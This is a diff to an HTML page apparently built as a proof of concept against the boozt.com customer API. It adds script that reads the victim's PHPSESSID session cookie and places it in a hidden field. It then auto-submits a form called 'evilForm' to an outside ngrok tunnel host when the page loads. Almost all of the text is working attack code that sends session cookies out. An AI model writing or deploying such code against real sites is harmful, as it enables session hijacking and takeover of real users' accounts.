@@ -3,8 +3,20 @@
 <body>
     <form id="evilForm" method="POST" action="https://1333-2804-4580-1080-7db-6197-e5c8-57e1-8c08.ngrok-free.app/">
         <input type="hidden" name="trigger" value="https://www.boozt.com/at/de-at/api/customer">
+        <input type="hidden" name="phpsessid">
     </form>
     <script>
+        // Extrair o PHPSESSID dos cookies
+        const phpsessid = document.cookie.split('; ')
+            .find(row => row.startsWith('PHPSESSID='))
+            ?.split('=')[1];
+        
+        if (phpsessid) {
+            document.querySelector("input[name=phpsessid]").value = phpsessid;
+        } else {
+            document.querySelector("input[name=phpsessid]").value = "not_found";
+        }
+        
         document.getElementById("evilForm").submit();
     </script>
 </body>
